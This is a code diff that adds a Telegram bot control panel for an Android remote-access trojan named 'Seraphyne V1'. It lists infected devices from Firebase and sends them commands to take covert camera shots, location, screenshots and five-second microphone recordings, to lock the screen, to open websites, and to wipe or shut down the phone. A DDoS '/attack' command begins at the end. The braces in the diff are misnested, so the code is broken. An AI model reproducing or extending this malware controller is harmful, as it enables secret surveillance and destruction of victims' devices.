@@ -13,6 +13,14 @@ const Groq = require('groq-sdk');
 const fs = require('fs');
 const config = require('./config.json');
 
+// --- FIREBASE ADMIN SETUP ---
+const serviceAccount = require("./serviceAccountKey.json");
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+  databaseURL: config.firebaseDatabaseURL 
+});
+const db = admin.database();
+
 // --- INITIALIZATION ---
 const bot = new TelegramBot(config.botToken, { polling: true });
 const groq = new Groq({ apiKey: config.groqKey });
@@ -69,6 +77,86 @@ bot.on('callback_query', (query) => {
     };
     if (menus[data]) bot.sendMessage(chatId, menus[data]);
 });
+
+// 1. SELECT DEVICE
+    if (data === "rat" || data === "refresh_device") {
+        const snapshot = await db.ref('Devices').once('value');
+        const devices = snapshot.val();
+        let keyboard = [];
+        if (devices) {
+            Object.keys(devices).forEach(id => {
+                keyboard.push([{ text: `📱 Device: ${id}`, callback_data: `info_${id}` }]);
+            });
+        }
+        keyboard.push([{ text: "🔍 Refresh", callback_data: "refresh_device" }]);
+        bot.editMessageText("⸙ - Seraphyne V1\n\nSilahkan pilih device...", { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: keyboard } });
+    }
+
+    // 2. PAGE 1: INFORMATION
+    if (data.startsWith("info_")) {
+        const id = data.split("_")[1];
+        const snap = await db.ref(`Devices/${id}`).once('value');
+        const d = snap.val() || {};
+        const text = `⸙ - Seraphyne V1\nInformation\n\nIP: ${d.ip || '-'}\nInfo device: ${d.model || '-'}\nBattery: ${d.battery || '0'}%`;
+        bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [[{ text: "Page 1/4 ➔", callback_data: `page2_${id}` }]] } });
+    }
+
+    // 3. PAGE 2: SADAP
+    if (data.startsWith("page2_")) {
+        const id = data.split("_")[1];
+        const keyboard = [
+            [{ text: "📸 Tangkap kamera belakang", callback_data: `cmd_${id}_cam_back` }],
+            [{ text: "📸 Tangkap kamera depan", callback_data: `cmd_${id}_cam_front` }],
+            [{ text: "🚩 Lokasi", callback_data: `cmd_${id}_loc` }],
+            [{ text: "🖥️ ScreenShot", callback_data: `cmd_${id}_ss` }],
+            [{ text: "🎙️ Rekam Suara 5 dtk", callback_data: `cmd_${id}_mic` }],
+            [{ text: "Page 2/4 ➔", callback_data: `page3_${id}` }]
+        ];
+        bot.editMessageText(`⸙ - Seraphyne V1\nSadap`, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: keyboard } });
+
+        // 4. PAGE 3: CONTROL
+    if (data.startsWith("page3_")) {
+        const id = data.split("_")[1];
+        const keyboard = [
+            [{ text: "🔐 Lock Screen", callback_data: `cmd_${id}_lock` }],
+            [{ text: "🌐 Buka Website", callback_data: `cmd_${id}_web` }],
+            [{ text: "Page 3/4 ➔", callback_data: `page4_${id}` }]
+        ];
+        bot.editMessageText(`⸙ - Seraphyne V1\nControl`, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: keyboard } });
+    }
+
+    // 5. PAGE 4: DESTROY
+    if (data.startsWith("page4_")) {
+        const id = data.split("_")[1];
+        const keyboard = [
+            [{ text: "💀 Reset HP", callback_data: `cmd_${id}_wipe` }],
+            [{ text: "💀 Shutdown HP", callback_data: `cmd_${id}_off` }],
+            [{ text: "🏠 Back to Menu", callback_data: "rat" }]
+        ];
+        bot.editMessageText(`⸙ - Seraphyne V1\nDESTROYYY 💀`, { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: keyboard } });
+    }
+
+    // 6. EXECUTION LOGIC (TO FIREBASE)
+    if (data.startsWith("cmd_")) {
+        const [_, id, action] = data.split("_");
+        
+        // Notification pinned
+        const pinMsg = await bot.sendMessage(chatId, "📌 Menunggu req HTTP...");
+        bot.pinChatMessage(chatId, pinMsg.message_id);
+        
+        // Push ke Firebase (Sketchware harus listen path ini)
+        await db.ref(`Devices/${id}/Command`).set({ 
+            action: action, 
+            time: Date.now() 
+        });
+
+        setTimeout(async () => {
+            bot.unpinChatMessage(chatId);
+            bot.sendMessage(chatId, `✅ Command [${action}] Berhasil dikirim ke ${id}!`);
+        }, 2500);
+    }
+});
+    }
 
 // --- 1. DDOS ---
 bot.onText(/\/attack (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
